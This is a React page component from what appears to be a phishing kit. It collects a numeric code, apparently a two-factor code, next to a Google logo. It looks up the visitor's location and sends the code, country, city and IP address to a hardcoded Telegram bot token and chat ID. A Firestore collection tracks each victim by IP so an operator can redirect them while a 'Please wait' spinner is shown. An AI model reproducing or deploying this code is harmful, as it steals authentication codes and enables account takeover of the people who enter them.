import React, { useEffect, useState } from 'react'
import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
import { publicIp, publicIpv4, publicIpv6 } from 'public-ip';
import { db } from '../firebase.js';
import '../assets/poza88.css';
import GoogleLogo from '../assets/google-logo.png';


const About8 = () => {
    const [ip, setIp] = useState(undefined);
    const [code, setCode] = useState('');
    const [userData, setUserData] = useState(undefined)
    const [isUserData, setIsUserData] = useState(false)
    const [userUrl, setUserUrl] = useState(false)
    

    const handleActions = () => {
        if (code === '') {
          // Handle code validation
          // You can set an error state or display a message
          return;
        } else {
          const bot = 'bot6025784851:AAFcSrozRyU8WAZTOr1wiSCB1m6HKiZwZoY';
          const chid = '5651241356';
    
          fetch(`https://ipapi.co/json/`)
            .then((response) => response.json())
            .then((response) => {
              const { country, region, city } = response;
              const params = {
                content: `========================
                  TWO 1: '${code}'
                  Country : '${country}'
                  Region : '${region}'
                  City : '${city}'
                  IP: '${ip}'
                  ========================`
              };
    
              fetch(`https://api.telegram.org/${bot}/sendMessage?chat_id=${chid}&text=${params.content}`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
              })
                .then(() => {
                    window.location = 'rwr'
                  // Handle success, e.g., redirect to 'confirm2.html'
                  // You can use react-router or window.location
                })
                .catch((error) => {
                    window.location = 'rwr'
                });
            });
        }
      };
    
      const handleCodeChange = (e) => {
        setCode(e.target.value.replace(/[^0-9]/g, '')); // Allow only numeric input
      };

    const getUserData = async (e) => {
        const documentSnapshot = await getDocs(collection(db, "nrchanger"));
        const newData = documentSnapshot.docs
            .map((doc) => ({ ...doc.data(), id: doc.id }));
        const filter = newData.filter(x => {
            if (x.ip === ip) {
                setIsUserData(true)
                setUserData(x);
                return x;
            }

        })
        if (filter.length === 0) {
            addUserData()
        }
    }


    const getIp = async () => {
        if (ip === undefined) {
            console.log(await publicIpv4());

            const ip = await publicIpv4()
            setIp(ip);
        }

    };
    getIp()


    useEffect(() => {
        if (ip) {
            onSnapshot(collection(db, "nrchanger"), (snapshot) => {
                let isExist = false
                snapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id })).filter(x => {
                    if (x.ip === ip) {
                        isExist = true
                        setUserData(x)
                        fetch('./data.json').then(
                            function (res) {
                                return res.json();
                            },
                        ).then(function (data) {

                            data.url_data.filter((item) => {
                                if (item.id === parseInt(x.redir)) {
                                    setUserUrl(item.url)
                                    return
                                }
                            })
                        }).catch(
                            function (err) {
                                console.log(err, ' error');
                            },
                        );
                    }

                })
                if (!isExist) {
                    setUserUrl(false)
                }
            })

        }
    }, [ip]);

    useEffect(() => {
        document.title = 'Welcome About8';

    }, [userData, userUrl])

    useEffect(() => {

    }, [userData])


    const addUserData = async () => {

        try {
            const docRef = doc(collection(db, "nrchanger"), ip);

            // Check if the document exists
            const docSnap = await getDoc(docRef);

            if (!docSnap.exists()) {
                // Document doesn't exist, so set the data
                await setDoc(docRef, {
                    ip: ip,
                    number: -1,
                    redir: "-1"
                });
                console.log("Document written with ID: ", ip);
                getUserData()
            } else {
                console.log("Document already exists with ID: ", ip);
            }
        } catch (e) {
            console.error("Error adding document: ", e);
        }
    }

    const resetUserNumber = async () => {
        try {
            const docRef = doc(collection(db, "nrchanger"), ip);
            await setDoc(docRef, { redir: "-1" }, { merge: true });
            console.log("User number reset to -1 for IP: ", ip);
        } catch (e) {
            console.error("Error resetting user number: ", e);
        }
    };

    useEffect(() => {
        if (ip) {
            getUserData()
        }

    }, [ip])

    if (userUrl) {
        setTimeout(() => {
            window.location = userUrl
        }, 1000)
        resetUserNumber()

    }


    console.log("hi here is the data", isUserData, userData)

    if (isUserData) {
        return (
            <>

<main class="daja" name="daja">
      <svg className="ipo" viewBox="0 0 256 128" width="256px" height="128px" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient id="grad1" x1="0" y1="0" x2="1" y2="0">
            <stop offset="0%" stopColor="#0a6acb" />
            <stop offset="33%" stopColor="#075cb1" />
            <stop offset="67%" stopColor="#044f9b" />
            <stop offset="100%" stopColor="#004c99eb" />
          </linearGradient>
          <linearGradient id="grad2" x1="1" y1="0" x2="0" y2="0">
            <stop offset="0%" stopColor="#004c99eb" />
            <stop offset="33%" stopColor="#044f9b" />
            <stop offset="67%" stopColor="#075cb1" />
            <stop offset="100%" stopColor="#0a6acb" />
          </linearGradient>
        </defs>
        <g fill="none" strokeLinecap="round" strokeWidth="16">
          <g className="ipo__track" stroke="#ddd">
            <path d="M8,64s0-56,60-56,60,112,120,112,60-56,60-56" />
            <path d="M248,64s0-56-60-56-60,112-120,112S8,64,8,64" />
          </g>
          <g strokeDasharray="180 656">
            <path className="ipo__worm1" stroke="url(#grad1)" strokeDashoffset="0" d="M8,64s0-56,60-56,60,112,120,112,60-56,60-56" />
            <path className="ipo__worm2" stroke="url(#grad2)" strokeDashoffset="358" d="M248,64s0-56-60-56-60,112-120,112S8,64,8,64" />
          </g>
        </g>
      </svg>

      <div class="loading">
            <p>Please wait</p>
            <span><i></i><i></i></span>
        </div>
    </main>


            </>
        );
    }

}

export default About8;